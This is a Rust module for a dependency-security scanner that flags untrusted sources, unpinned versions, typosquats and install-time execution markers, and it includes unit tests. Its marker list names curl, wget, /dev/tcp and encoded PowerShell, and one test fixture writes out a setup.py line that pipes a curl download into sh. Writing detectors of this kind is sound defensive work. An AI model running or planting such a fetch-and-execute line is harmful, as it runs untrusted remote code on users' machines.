//! Deterministic, offline danger heuristics over declared dependencies and manifest text.
//! Every signal is explainable and weighted (no opaque ML), and every hit is emitted as a
//! reviewable candidate `Finding` so a human/LLM can confirm real vs. false positive.
//!
//! Grounded in klayer `cybersecurity` supply-chain guidance: keep deps pinned/patched,
//! never trust an untrusted source, watch for install-time code execution (injection).

use crate::model::{Package, VersionSpec};
use allem_core::{Category, Confidence, Finding, Location, PackageRef, Severity, SuggestedAction};
use std::path::PathBuf;

/// A short list of high-popularity package names per ecosystem used for typosquat
/// detection. A name one edit away from one of these (but not equal) is suspicious.
fn popular_names(ecosystem: &str) -> &'static [&'static str] {
    match ecosystem {
        "PyPI" => &[
            "requests",
            "numpy",
            "pandas",
            "flask",
            "django",
            "urllib3",
            "setuptools",
            "boto3",
            "pillow",
            "pytest",
        ],
        "crates.io" => &[
            "serde", "tokio", "rand", "clap", "anyhow", "regex", "syn", "libc", "log", "reqwest",
        ],
        _ => &[],
    }
}

/// Substrings that indicate install-time / build-time code execution — the manifest-level
/// signal for an injection vector. (Deep AST sink analysis lands with the tree-sitter layer.)
const INJECTION_MARKERS: &[&str] = &[
    "os.system(",
    "subprocess.",
    "eval(",
    "exec(",
    "__import__(",
    "base64.b64decode",
    "curl ",
    "wget ",
    "powershell -enc",
    "/dev/tcp/",
];

/// Run all package-level danger checks. Returns one finding per distinct signal.
pub fn check_packages(packages: &[Package]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for pkg in packages {
        if let Some(f) = untrusted_source(pkg) {
            findings.push(f);
        }
        if let Some(f) = unpinned_version(pkg) {
            findings.push(f);
        }
        if let Some(f) = typosquat(pkg) {
            findings.push(f);
        }
    }
    findings
}

/// Scan a manifest/setup file's raw text for install-time execution markers.
pub fn scan_injection(manifest: &str, text: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    for (idx, line) in text.lines().enumerate() {
        for marker in INJECTION_MARKERS {
            if line.contains(marker) {
                let line_no = (idx + 1) as u32;
                findings.push(
                    Finding::new(
                        format!("dep/inject/{manifest}/{line_no}/{marker}"),
                        Category::DependencyInjection,
                        Severity::High,
                        format!("install-time code-execution marker `{marker}` in {manifest}"),
                    )
                    .with_location(Location {
                        path: PathBuf::from(manifest),
                        line: Some(line_no),
                        column: None,
                    })
                    .with_evidence("marker", marker.to_string().into())
                    .with_evidence("snippet", line.trim().to_string().into())
                    .with_action(SuggestedAction {
                        action_type: "review".into(),
                        to: None,
                        confidence: Confidence::Medium,
                    }),
                );
            }
        }
    }
    findings
}

fn pkg_ref(pkg: &Package) -> PackageRef {
    PackageRef {
        ecosystem: pkg.ecosystem.to_string(),
        name: pkg.name.clone(),
        version: pkg.version.raw().to_string(),
    }
}

fn location(pkg: &Package) -> Location {
    Location {
        path: PathBuf::from(&pkg.manifest),
        line: pkg.line,
        column: None,
    }
}

fn untrusted_source(pkg: &Package) -> Option<Finding> {
    let (kind, url) = match &pkg.version {
        VersionSpec::Vcs(u) => ("vcs", u.clone()),
        VersionSpec::Url(u) => ("url", u.clone()),
        _ => return None,
    };
    Some(
        Finding::new(
            format!("dep/source/{}/{}", pkg.ecosystem, pkg.name),
            Category::DependencyDangerous,
            Severity::Medium,
            format!(
                "`{}` is sourced from an untrusted {kind} ({url}), bypassing the registry",
                pkg.name
            ),
        )
        .with_package(pkg_ref(pkg))
        .with_location(location(pkg))
        .with_evidence("source_kind", kind.into())
        .with_action(SuggestedAction {
            action_type: "review".into(),
            to: None,
            confidence: Confidence::Medium,
        }),
    )
}

fn unpinned_version(pkg: &Package) -> Option<Finding> {
    // Wildcard is the dangerous case; concrete pins and VCS/URL handled elsewhere.
    if !matches!(pkg.version, VersionSpec::Wildcard) {
        return None;
    }
    Some(
        Finding::new(
            format!("dep/unpinned/{}/{}", pkg.ecosystem, pkg.name),
            Category::DependencyDangerous,
            Severity::Medium,
            format!(
                "`{}` has an unpinned (wildcard) version — any release, including a \
                 compromised one, will be accepted",
                pkg.name
            ),
        )
        .with_package(pkg_ref(pkg))
        .with_location(location(pkg))
        .with_action(SuggestedAction {
            action_type: "pin".into(),
            to: None,
            confidence: Confidence::High,
        }),
    )
}

fn typosquat(pkg: &Package) -> Option<Finding> {
    let name = pkg.name.to_lowercase();
    for popular in popular_names(pkg.ecosystem) {
        if name != *popular && levenshtein(&name, popular) == 1 {
            return Some(
                Finding::new(
                    format!("dep/typosquat/{}/{}", pkg.ecosystem, pkg.name),
                    Category::DependencyDangerous,
                    Severity::High,
                    format!(
                        "`{}` is one character away from the popular package `{popular}` \
                         — possible typosquat",
                        pkg.name
                    ),
                )
                .with_package(pkg_ref(pkg))
                .with_location(location(pkg))
                .with_evidence("resembles", (*popular).into())
                .with_action(SuggestedAction {
                    action_type: "review".into(),
                    to: Some((*popular).to_string()),
                    confidence: Confidence::Medium,
                }),
            );
        }
    }
    None
}

/// Classic Levenshtein edit distance (small inputs; iterative two-row).
fn levenshtein(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let mut prev: Vec<usize> = (0..=b.len()).collect();
    let mut curr = vec![0usize; b.len() + 1];
    for (i, ca) in a.iter().enumerate() {
        curr[0] = i + 1;
        for (j, cb) in b.iter().enumerate() {
            let cost = if ca == cb { 0 } else { 1 };
            curr[j + 1] = (prev[j + 1] + 1).min(curr[j] + 1).min(prev[j] + cost);
        }
        std::mem::swap(&mut prev, &mut curr);
    }
    prev[b.len()]
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    fn pkg(name: &str, version: VersionSpec) -> Package {
        Package {
            ecosystem: "PyPI",
            name: name.to_string(),
            version,
            manifest: "requirements.txt".to_string(),
            line: Some(1),
        }
    }

    #[test]
    fn wildcard_is_flagged_dangerous() {
        let f = check_packages(&[pkg("requests", VersionSpec::Wildcard)]);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].category, Category::DependencyDangerous);
    }

    #[test]
    fn pinned_version_is_clean() {
        let f = check_packages(&[pkg("requests", VersionSpec::Pinned("2.31.0".into()))]);
        assert!(f.is_empty());
    }

    #[test]
    fn typosquat_detected_one_edit_away() {
        // "reqests" is one deletion away from the popular "requests".
        let f = check_packages(&[pkg("reqests", VersionSpec::Pinned("1.0".into()))]);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert_eq!(f[0].category, Category::DependencyDangerous);
    }

    #[test]
    fn vcs_source_flagged() {
        let f = check_packages(&[pkg(
            "requests",
            VersionSpec::Vcs("git+https://evil.example/r.git".into()),
        )]);
        assert_eq!(f.len(), 1);
    }

    #[test]
    fn injection_marker_in_setup_text() {
        let text = "from setuptools import setup\nos.system('curl http://x | sh')\n";
        let f = scan_injection("setup.py", text);
        assert!(!f.is_empty());
        assert_eq!(f[0].category, Category::DependencyInjection);
    }
}
